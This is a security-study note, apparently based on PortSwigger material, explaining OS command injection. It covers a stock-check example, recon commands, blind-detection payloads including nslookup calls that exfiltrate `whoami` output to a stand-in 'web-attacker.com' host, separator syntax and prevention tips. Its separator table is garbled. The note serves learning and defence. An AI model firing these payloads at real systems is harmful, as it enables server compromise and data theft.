---
title: OS Command Injection (Shell Injection)
draft: false
tags:
  - Vulnerability
  - web
  - offensive-security
  - OS-Command-Injection
  - Shell-Injection
NeedsReview: true
---
# 🛡️ OS Command Injection (Shell Injection)

> [!info] What is OS Command Injection?
> OS command injection is a critical vulnerability that allows an attacker to execute arbitrary operating system commands on the server running the application. This can lead to full system compromise and lateral movement within the infrastructure.

## 🧠 How It Works

Applications that pass user input directly into shell commands without proper sanitization are vulnerable. Attackers can inject shell metacharacters to execute additional commands.

### 💬 Example Scenario

A shopping app checks stock using a shell command:
```

bash stockreport.pl 381 29

```
An attacker submits:
```

& echo aiwefwlguh &

```
Resulting in:
```

bash stockreport.pl & echo aiwefwlguh & 29

```
> [!danger] Output
> ```
> Error - productID was not provided  
> aiwefwlguh  
> 29: command not found  
> ```

This confirms that the injected command (`echo aiwefwlguh`) was executed.

## 🧪 Useful Recon Commands

| Purpose                  | Linux           | Windows         |
|--------------------------|------------------|------------------|
| Current user             | `whoami`         | `whoami`         |
| OS version               | `uname -a`       | `ver`            |
| Network config           | `ifconfig`       | `ipconfig /all`  |
| Network connections      | `netstat -an`    | `netstat -an`    |
| Running processes        | `ps -ef`         | `tasklist`       |

## 🕵️‍♂️ Blind OS Command Injection

### 🕒 Time Delay Detection
```

bash & ping -c 10 127.0.0.1 &

```
This causes a 10-second delay, confirming command execution based on response time.

### 📤 Output Redirection
```

bash & whoami > /var/www/static/whoami.txt &

```
Then access:
```

https://vulnerable-website.com/whoami.txt

```
### 🌐 Out-of-Band (OAST) Interaction
```

bash & nslookup kgji2ohoyw.web-attacker.com &

```
To exfiltrate data:
```

bash & nslookup `whoami`.kgji2ohoyw.web-attacker.com &

```
## 🧬 Injection Techniques

### 🔧 Command Separators

| Separator    | Platforms |     |     |                |
| ------------ | --------- | --- | --- | -------------- |
| `&`, `&&`, ` | `, `      |     | `   | Unix & Windows |
| `;`, `\n`    | Unix only |     |     |                |

### 🔧 Inline Execution (Unix)

- Backticks: `` `command` ``
- Dollar syntax: `$(command)`

### 🧩 Quoted Contexts

If input is inside quotes, terminate the quote (`"`, `'`) before injecting commands.

## 🛡️ Prevention Tips

> [!tip] Best Practices
> - Avoid using shell commands with user input  
> - Use safe APIs or libraries instead of shell calls  
> - Sanitize and validate all inputs  
> - Apply least privilege to application processes  
> - Monitor and log command execution

## 🔗 Resources

- 🌐 PortSwigger: [OS Command Injection](https://portswigger.net/web-security/os-command-injection)
